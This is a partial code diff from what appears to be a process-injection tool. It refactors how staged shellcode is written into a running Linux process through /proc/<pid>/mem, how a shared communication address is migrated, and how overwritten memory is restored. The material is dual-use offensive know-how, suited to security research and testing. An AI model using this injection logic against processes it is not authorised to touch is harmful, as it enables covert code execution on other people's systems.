+                #stage1_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{hex(injection_params.read_execute_region_address)}"
+                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-use_existing_read-execute.s"))
             else:
-                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-allocate_read-execute.s:FRAGMENT]")
+                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-allocate_read-execute.s"))
             if injection_params.existing_read_write_address:
                 injection_params.read_write_region_address = injection_params.existing_read_write_address
                 log_warning(f"Attempting to reuse existing read/write block at {hex(injection_params.read_write_region_address)}")
-                stage1_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{injection_params.read_write_region_address}"
-                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-use_existing_read-write.s:FRAGMENT]")
+                #stage1_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{injection_params.read_write_region_address}"
+                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-use_existing_read-write.s"))
             else:
-                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-allocate_read-write.s:FRAGMENT]")
+                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-allocate_read-write.s"))
+
+            stage1_replacements = injection_params.get_replacement_variable_map()
             
             stage1 = assemble(stage_1_code, injection_params, memory_map_data, replacements=stage1_replacements)
 
@@ -1391,7 +1545,7 @@ def asminject(injection_params):
                     log(f"Created the pre-injection memory region backup in '{memory_region_backup.backup_directory}'", ansi=injection_params.ansi)
                 with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                     # back up the code we're about to overwrite
-                    code_backup_address = instruction_pointer
+                    code_backup_address = injection_params.saved_instruction_pointer_value
                     mem.seek(code_backup_address)
                     code_backup = mem.read(len(stage1))
 
@@ -1403,20 +1557,20 @@ def asminject(injection_params):
                     
                     
                     # back up the data at the communication address
-                    mem.seek(communication_address)
+                    mem.seek(injection_params.initial_communication_address)
                     communication_address_backup = mem.read(injection_params.communication_address_backup_size)
-                    output_memory_block_data(injection_params, f"Communication address backup ({hex(communication_address)})", communication_address_backup)
+                    output_memory_block_data(injection_params, f"Communication address backup ({hex(injection_params.initial_communication_address)})", communication_address_backup)
                     
                     # Set the "memory restored" state variable to match the first 4 bytes of the backed up communications address data
-                    injection_params.state_variables.state_memory_restored = struct.unpack('I', communication_address_backup[0:4])[0]
-                    #log(f"Will specify {hex(injection_params.state_variables.state_stage_two_written)} @ {hex(communication_address)} as the 'memory restored' value", ansi=injection_params.ansi)
+                    #injection_params.state_variables.state_memory_restored = struct.unpack('I', communication_address_backup[0:4])[0]
+                    #log(f"Will specify {hex(injection_params.state_variables.state_stage_two_written)} @ {hex(injection_params.initial_communication_address)} as the 'memory restored' value", ansi=injection_params.ansi)
                     log(f"Using: {hex(injection_params.state_variables.state_ready_for_memory_restore)} for 'ready for memory restore' state value", ansi=injection_params.ansi)
 
                     # write the primary shellcode
-                    mem.seek(instruction_pointer)
+                    mem.seek(injection_params.saved_instruction_pointer_value)
                     mem.write(stage1)
 
-                log(f"Wrote first stage shellcode at {hex(instruction_pointer)} in target process {injection_params.pid}", ansi=injection_params.ansi)
+                log(f"Wrote first stage shellcode at {hex(injection_params.saved_instruction_pointer_value)} in target process {injection_params.pid}", ansi=injection_params.ansi)
 
         if injection_params.pause_before_resume:
             input("Press Enter to resume the target process")
@@ -1449,24 +1603,49 @@ def asminject(injection_params):
 
         if continue_executing:
             stage2 = None
-            stage2_replacements['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = f"{instruction_pointer}"
-            stage2_replacements['[VARIABLE:STACK_POINTER:VARIABLE]'] = f"{stack_pointer}"
-            stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
-            stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_variables.state_memory_restored}"
-            stage2_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(stack_pointer - injection_params.stack_backup_size)}"
-            log(f"Waiting for stage 1 to indicate that it has allocated additional memory and is ready for the script to write stage 2", ansi=injection_params.ansi)
-            current_state = wait_for_communication_state(injection_params, injection_params.pid, communication_address, injection_params.state_variables.state_ready_for_stage_two_write)
-            if not injection_params.existing_read_execute_address:
-                injection_params.read_execute_region_address = current_state.read_execute_address
             if not injection_params.existing_read_write_address:
+                log(f"Waiting for stage 1 to indicate that it is ready to switch to a new communication address", ansi=injection_params.ansi)
+                current_state = wait_for_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_switch_to_new_communication_address)
+            if injection_params.existing_read_execute_address:
+                log_success(f"Existing read/execute base address: {hex(injection_params.read_execute_region_address)}", ansi=injection_params.ansi)
+            else:
+                injection_params.read_execute_region_address = current_state.read_execute_address
+                log_success(f"New read/execute base address: {hex(injection_params.read_execute_region_address)}", ansi=injection_params.ansi)
+            if injection_params.existing_read_write_address:
+                log_success(f"Existing read/write base address: {hex(injection_params.read_write_region_address)}", ansi=injection_params.ansi)
+            else:
                 injection_params.read_write_region_address = current_state.read_write_address
-            log_success(f"Read/execute base address: {hex(injection_params.read_execute_region_address)}")
-            log_success(f"Read/execute base address: {hex(injection_params.read_write_region_address)}")
-            stage2_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{injection_params.read_execute_region_address}"
-            stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{injection_params.read_write_region_address}"
-            stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{injection_params.get_region_info_stack_backup().start_address}"
-            stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{injection_params.get_region_info_arbitrary_data().start_address}"
-            stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{injection_params.read_write_region_address + injection_params.read_write_region_size}"
+                log_success(f"New read/write base address: {hex(injection_params.read_write_region_address)}", ansi=injection_params.ansi)
+            
+            log_success(f"New communication address: {hex(injection_params.get_base_communication_address())}", ansi=injection_params.ansi) 
+            
+            # stage2_replacements['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = f"{injection_params.saved_instruction_pointer_value}"
+            # stage2_replacements['[VARIABLE:STACK_POINTER:VARIABLE]'] = f"{injection_params.saved_stack_pointer_value}"
+            # stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
+            # stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_variables.state_memory_restored}"
+            # stage2_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(injection_params.saved_stack_pointer_value - injection_params.stack_backup_size)}"
+            log(f"Waiting for stage 1 to indicate that it has allocated additional memory and is ready for the script to write stage 2", ansi=injection_params.ansi)
+            current_state = wait_for_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_ready_for_stage_two_write)
+            
+            # restore the data at the original communication address now that communication has migrated\
+            log(f"Restoring data at original communications address {hex(injection_params.initial_communication_address)}", ansi=injection_params.ansi)
+            with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
+                mem.seek(injection_params.initial_communication_address)
+                mem.write(communication_address_backup)
+                
+                mem.seek(injection_params.initial_communication_address)
+                current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
+                output_memory_block_data(injection_params, f"Communication address location after memory restore ({hex(injection_params.initial_communication_address)})", current_communication_address_backup)
+            
+            # stage2_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{injection_params.read_execute_region_address}"
+            # stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{injection_params.read_write_region_address}"
+            # stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{injection_params.get_region_info_stack_backup().start_address}"
+            # stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{injection_params.get_region_info_arbitrary_data().start_address}"
+            # stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{injection_params.read_write_region_address + injection_params.read_write_region_size}"
+
+            injection_params.code_backup_length = len(code_backup)
+
+            stage2_replacements = injection_params.get_replacement_variable_map()
 
             stage2 = assemble(stage2_source_code, injection_params, memory_map_data, replacements=stage2_replacements)
                 
@@ -1484,8 +1663,8 @@ def asminject(injection_params):
                         input("Press Enter to proceed with launching stage 2")
                     
                     # Give stage 1 the OK to proceed
-                    log(f"Writing {hex(injection_params.state_variables.state_stage_two_written)} to {hex(communication_address)} in target memory to indicate stage 2 has been written to memory", ansi=injection_params.ansi)
-                    mem.seek(communication_address)
+                    log(f"Writing {hex(injection_params.state_variables.state_stage_two_written)} to {hex(injection_params.get_base_communication_address())} in target memory to indicate stage 2 has been written to memory", ansi=injection_params.ansi)
+                    mem.seek(injection_params.get_base_communication_address())
                     ok_val = struct.pack('I', injection_params.state_variables.state_stage_two_written)
                     mem.write(ok_val)
                     log_success("Stage 2 proceeding", ansi=injection_params.ansi)
@@ -1494,7 +1673,7 @@ def asminject(injection_params):
                     log(f"Waiting {injection_params.restore_delay} second(s) before starting memory restore check", ansi=injection_params.ansi)
                     time.sleep(injection_params.restore_delay)
                 log(f"Waiting for stage 2 to indicate that it is ready for process memory to be restored", ansi=injection_params.ansi)
-                current_state = wait_for_communication_state(injection_params, injection_params.pid, communication_address, injection_params.state_variables.state_ready_for_memory_restore)
+                current_state = wait_for_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_ready_for_memory_restore)
                 if injection_params.pause_before_memory_restore:
                     input("Press Enter to proceed with memory restoration")
                 log("Restoring original memory content", ansi=injection_params.ansi)
@@ -1517,12 +1696,17 @@ def asminject(injection_params):
                     
                     # communication address restore
                     
-                    mem.seek(communication_address)
+                    mem.seek(injection_params.initial_communication_address)
                     current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
-                    output_memory_block_data(injection_params, f"Communication address location after shellcode execution ({hex(communication_address)})", current_communication_address_backup)
+                    output_memory_block_data(injection_params, f"Communication address location after shellcode execution ({hex(injection_params.initial_communication_address)})", current_communication_address_backup)
 
                 if injection_params.pause_after_memory_restore:
-                    input("Press Enter to restore the communications address backup and allow the inner payload to execute")
+                    input("Press Enter to allow the inner payload to execute")
+
+                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
+                    mem.seek(injection_params.get_base_communication_address())
+                    ok_val = struct.pack('I', injection_params.state_variables.state_memory_restored)
+                    mem.write(ok_val)
 
                 if injection_params.enable_debugging_output:
                     memory_region_backup_comparison = back_up_memory_regions(injection_params, memory_map_data, injection_params.memory_region_backup_subdirectory_name + "-post_injection_comparison")
@@ -1530,14 +1714,14 @@ def asminject(injection_params):
                     
                 restore_memory_regions(injection_params, memory_region_backup)
 
-                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
-                    mem.seek(communication_address)
-                    mem.write(communication_address_backup)
+                # with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
+                    # mem.seek(injection_params.initial_communication_address)
+                    # mem.write(communication_address_backup)
                     
-                    mem.seek(communication_address)
-                    current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
-                    output_memory_block_data(injection_params, f"Communication address location after memory restore ({hex(communication_address)})", current_communication_address_backup)
-                #restore_memory_regions(injection_params, memory_region_backup)
+                    # mem.seek(injection_params.initial_communication_address)
+                    # current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
+                    # output_memory_block_data(injection_params, f"Communication address location after memory restore ({hex(injection_params.initial_communication_address)})", current_communication_address_backup)
+                # #restore_memory_regions(injection_params, memory_region_backup)
                 
                 if injection_params.enable_debugging_output:
                     memory_region_backup_comparison = back_up_memory_regions(injection_params, memory_map_data, injection_params.memory_region_backup_subdirectory_name + "-post_restore_comparison")
@@ -1758,7 +1942,7 @@ if __name__ == "__main__":
     
     if args.use_read_write_size:
         injection_params.read_write_region_size = args.use_read_write_size
-        injection_params.set_rwb_arbitrary_data_block_values()
+        injection_params.set_rwr_arbitrary_data_block_values()
     
     if args.preserve_temp_files:
         injection_params.delete_temp_files = False
